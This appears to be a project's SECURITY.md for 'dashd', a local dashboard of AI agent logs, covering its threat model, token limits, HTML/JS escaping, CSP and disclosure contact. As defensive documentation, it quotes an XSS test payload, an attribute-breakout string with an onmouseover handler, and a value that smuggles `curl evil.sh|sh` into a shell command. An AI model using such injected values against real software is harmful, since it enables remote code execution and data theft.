# Security

## Threat model

`dashd` is a local single-user tool. It reads log files written by other programs,
keeps them in a SQLite database on the same machine, and serves HTML from that
database over HTTP.

The defaults are chosen for that case and are safe for it:

* The listener binds **`127.0.0.1`**. Nothing off-host can reach it.
* There is **no authentication** by default, because there is nothing to
  authenticate to on a loopback-only socket.

What the default does not cover:

* **`-addr 0.0.0.0` exposes real data.** Project paths, session titles, model
  names and dollar figures come straight from agent logs. Anyone who can reach
  the port can read all of it, and it says things about your work and your
  machine. There is no built-in authorization model beyond a single shared
  token, so treat `-addr 0.0.0.0` without `-auth-token` as a disclosure. The
  container image is loopback-only for the same reason; publishing it takes an
  explicit `-addr` and a token, and the Dockerfile says so.
* **Log contents are untrusted input.** Model ids, paths and session titles are
  attacker-controlled from the browser's point of view — anyone who can get a
  crafted string into an agent log controls what the dashboard renders. That is
  a wider set of people than it first sounds: anything that can write into a
  scanned log directory, which includes a malicious package in a project you
  cloned, an agent following an instruction it found in a transcript, and
  anyone with write access to your home directory. See below for what is
  actually enforced on each side.
* **The database file is as sensitive as the logs.** It holds the same project
  paths and costs in queryable form, unencrypted. It is gitignored; keep it that
  way.

`-auth-token` is the way to protect a network-exposed instance: pass a long random
value and send `Authorization: Bearer <token>` or `X-Auth-Token`. It is
transport-level only — it does not encrypt traffic, so do not put it on an
untrusted network without TLS in front.

### `-auth-token` on the command line is readable by any local user

This is a real limitation of the current interface, not a caveat about how you
use it. `dashd` takes the token as a flag and has no other way to receive it: it
does not read an environment variable, and no flag file exists. A flag value is
in the process's `argv`, which on Linux is world-readable — `ps aux` shows it to
every user on the machine, for as long as the process runs.

So a token passed on the command line protects the dashboard against anyone who
can reach the *port* and does not protect it against anyone with a shell on the
*host*. That is usually the right trade for a single-user tool — a local user can
already read the database file — but it should be a decision rather than a
surprise.

What to do about it:

* **On a machine with other users, keep the default loopback bind.** No token is
  needed and none is exposed, because nothing can reach the port but you.
* **Where you must expose it**, generate the token at read time
  (`-auth-token "$(openssl rand -hex 32)"`) and accept that the host's users can
  see it, or front the service with a reverse proxy that terminates TLS and does
  the authentication instead.
* **`packaging/dashd.service` passes no token, deliberately**, and is commented to
  say why: it is the loopback arrangement above, where a token would be a secret
  handed to every local user for no benefit. Its `EnvironmentFile=` comment shows
  the shape an environment-variable token would take if `cmd/dashd` ever reads
  one — it does not today, and an `Environment=` line for a variable the binary
  ignores would be worse than nothing, since it looks like protection that is not
  there.

Reading the token from the environment (or a root-only file) is a small, contained
change in `cmd/dashd`, and the reason it is not done yet is that no arrangement
here needs it.

**`-auth-token` is not a mitigation for script running in the page.** It is a
request header, checked before the response is built. A payload that executes
same-origin runs with the reader's authority, not with the token's: it can read
every project path and cost figure the page can see, and it can fetch every
endpoint the token would have unlocked. The token decides who may ask; it does
nothing about what the page does with what it is told. Same-origin script is
therefore treated as a full compromise of everything this document lists as
sensitive, and the controls below are about preventing it rather than about
limiting it.

### What is escaped, and how that is checked

The page is built in two halves and they are defended separately.

**Server-rendered markup** goes through `html/template`, which escapes
interpolated values by context, plus the `jsonList` helper for values placed
into a `<script>` block as JSON. `TestPageEscapesUntrustedValues` asserts this
with a payload of `</script><img src=x onerror=alert(1)>` in a project path and
a title: neither a live element nor a broken-out script block.

**Client-rendered markup** is assembled by string concatenation in
`internal/web/assets/dashboard.js` and is *not* covered by that test — the Go
template never sees most of it, because the values arrive as JSON and are
written into the DOM by the script. Every such value must go through the
script's `escapeHtml`, which escapes all six of `& < > " ' ` — both quotes and
the backtick. It is defined there and used at every `title=` and `data-*` sink;
if you add a field, it needs the same treatment.

Note what the tests on each side actually check, because they are not
interchangeable:

| Test | Layer it checks |
|---|---|
| `TestPageEscapesUntrustedValues` | the Go template, via a served page |
| `TestJSEscaperNeutralisesQuotesAndBacktick` | the escaper's own source — that it escapes both quotes and the backtick, and that the old `innerHTML` round-trip has not come back |
| `TestJSAttributeSinksEscapeTheirValues` | the `title=` and `data-resume-cmd=` sinks are wrapped in `escapeHtml`, read from the source |
| `TestJSProjectAndSessionNamesAreEscapedNotRaw` | the rendered `renderProjects` / `renderSessions` output, by running the script |
| `TestEveryResponseCarriesSecurityHeaders`, `TestCSPDoesNotAllowInlineScript`, `TestCSPNonceMatchesTheInlineScripts`, `TestCSPNonceChangesPerResponse` | the response headers, including that all three inline scripts carry the response's nonce |
| `TestJSHasNoInlineEventHandlers` | that no `on*=` attribute exists in the script, which is what makes the CSP's lack of `'unsafe-inline'` viable |
| `TestJSResumeCommandIsQuotedForSh` | `sh` quoting of the resume command, which is a different escaping problem entirely |

Only the first row exercises a browser-equivalent escaping; the two middle
script-source rows are static checks, which is a real limitation and is why the
row below them exists.

The client half was wrong once and the bug was instructive, so it is worth
stating what it was. `escapeHtml` used to round-trip its argument through a
detached element's `innerHTML`, which escapes `& < >` and neither quote. A
crafted project path of

    /tmp/evil" onmouseover="window.__xss1=1

therefore closed its own `title=` attribute and appended an event handler, and
the page rendered

    <td class="project-name" title="/tmp/evil" onmouseover="window.__xss1=1">

No new element could be injected, since `<` and `>` were escaped; the handler was
the whole attack, and this dashboard is built around hover tooltips, so
`onmouseover` fires on ordinary use. Reproduced in headless Chromium against a
crafted log. The replacement escapes by table lookup with no DOM involved, and
`TestJSEscaperNeutralisesQuotesAndBacktick`,
`TestJSAttributeSinksEscapeTheirValues` and
`TestJSProjectAndSessionNamesAreEscapedNotRaw` in `internal/web` assert it.

Two independent controls sit behind that, and either alone is worth having:

* A **Content-Security-Policy** with no `'unsafe-inline'` in `script-src`, so an
  event handler is refused however it reached the document. `style-src` does
  keep `'unsafe-inline'`, because the page writes `style` attributes throughout
  and a style attribute cannot execute script; that relaxation is deliberate and
  is the only one. The three inline `<script>` blocks — the payload, the filter
  state, and the script that prefills the filter form — carry a per-response
  nonce, which is why the inline `onclick` handlers were moved to `data-`
  attributes and one delegated listener.
* **No inline event handlers at all.** Inline handlers would have forced
  `'unsafe-inline'` into `script-src`, which would equally permit the injected
  handler the policy exists to stop. It also keeps values out of
  `onclick="f('${value}')"`, which nests a JS string inside an HTML attribute and
  is a quoting problem waiting for the first value containing a quote.

One command needs escaping that is not HTML escaping. The Copy button builds a
`sh` command line from the session's working directory and log path, and a value
of

    /x" ; curl evil.sh|sh ; "

closed the double-quoted argument and made the rest a second command. Each value
is now single-quoted for `sh`, where every character is inert, with the usual
`'\''` for the one character that can end that quoting.
`TestJSResumeCommandIsQuotedForSh` asserts it. This one is worth calling out
because the dashboard vouches for the string: it offers it on a button and
documents it as the way to resume a session.

`/healthz` is exempt from `-auth-token` so a container healthcheck does not need
the secret in its command, its compose file and every uptime monitor's config. It
returns call and session counts and nothing else — no paths, no models, no
titles — and its aggregate is cached for five seconds, so an unauthenticated
endpoint cannot be used to make the server scan its call table on demand.

## Reporting a vulnerability

Email **tmamacos@gmail.com** with a description and reproduction steps. Please
give a few days before public disclosure. Reports of parsing bugs that let a
crafted log inject content into a page, or that make the scanner lose or
duplicate history, are especially welcome.

I will not promise a fix timeline, but I will acknowledge the report.